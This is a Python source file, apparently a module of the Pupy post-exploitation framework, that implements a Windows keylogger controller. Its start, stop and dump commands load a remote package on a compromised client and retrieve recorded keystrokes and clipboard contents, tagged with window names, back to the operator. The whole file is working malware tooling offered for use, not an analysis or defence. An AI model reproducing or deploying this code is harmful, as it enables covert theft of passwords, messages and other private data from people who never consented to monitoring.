# -*- coding: UTF8 -*-
from pupylib.PupyModule import *
import StringIO
import SocketServer
import threading
import socket
import logging
import struct
import traceback
import time
from pupylib.utils.rpyc_utils import redirected_stdio

__class_name__="KeyloggerModule"

@config(compat="windows", cat="gather")
class KeyloggerModule(PupyModule):
	""" 
		A keylogger to monitor all keyboards interaction including the clipboard :-)
		The clipboard is also monitored and the dump includes the window name in which the keys are beeing typed
	"""
	#max_clients=1
	daemon=True
	unique_instance=True
	def init_argparse(self):
		self.arg_parser = PupyArgumentParser(prog='keylogger', description=self.__doc__)
		self.arg_parser.add_argument('action', choices=['start', 'stop', 'dump'])

	def stop_daemon(self):
		self.success("keylogger stopped")
		
	def run(self, args):
		if args.action=="start":
			self.client.load_package("pupwinutils.keylogger")
			with redirected_stdio(self.client.conn): #to see the output exception in case of error
				if not self.client.conn.modules["pupwinutils.keylogger"].keylogger_start():
					self.error("the keylogger is already started")
				else:
					self.success("keylogger started !")
		elif args.action=="dump":
			self.success("dumping recorded keystrokes :")
			data=self.client.conn.modules["pupwinutils.keylogger"].keylogger_dump()
			if data is None:
				self.error("keylogger not started")
			else:
				self.log(data)

		elif args.action=="stop":
			if self.client.conn.modules["pupwinutils.keylogger"].keylogger_stop():
				self.success("keylogger stopped")
			else:
				self.success("keylogger is not started")



